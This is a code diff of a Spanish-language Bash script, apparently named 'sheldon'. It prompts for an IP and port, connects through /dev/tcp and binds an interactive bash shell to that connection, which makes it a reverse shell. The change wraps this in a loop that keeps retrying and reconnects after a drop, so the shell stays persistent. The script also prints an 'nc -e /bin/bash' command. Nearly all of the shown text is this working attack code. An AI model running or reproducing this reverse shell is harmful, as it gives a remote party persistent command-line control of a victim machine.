@@ -31,15 +31,21 @@ read -p "$(echo -e ${green}¿Ejecutar sheldon a $ip en el puerto $port? [S/n]:${
 [[ "$go" != "" && "$go" != "s" ]] && echo -e "${red}Operación cancelada.${reset}" && exit 0
 
 echo -e "${cyan}nc -e /bin/bash $ip $port${reset}"
-echo -e "${mag}Esperando conexión...${reset}"
 
-# esperar/reintentar
 while true; do
-  exec 3<>"/dev/tcp/$ip/$port" 2>/dev/null && break
-  echo -ne "${yellow}no hay listener aún, reintentando...${reset}\r"
+  echo -e "${mag}Esperando conexión...${reset}"
+
+  # esperar/reintentar
+  while true; do
+    exec 3<>"/dev/tcp/$ip/$port" 2>/dev/null && break
+    echo -ne "${yellow}no hay listener aún, reintentando...${reset}\r"
+    sleep 1
+  done
+  echo -e "\n${green}Conectado.${reset}"
+
+  /bin/bash -i <&3 >&3 2>&3
+  exec 3<&- 3>&-
+
+  echo -e "${red}Conexión perdida, esperando nuevamente...${reset}"
   sleep 1
 done
-echo -e "\n${green}Conectado.${reset}"
-
-exec 0<&3 1>&3 2>&3
-exec /bin/bash -i
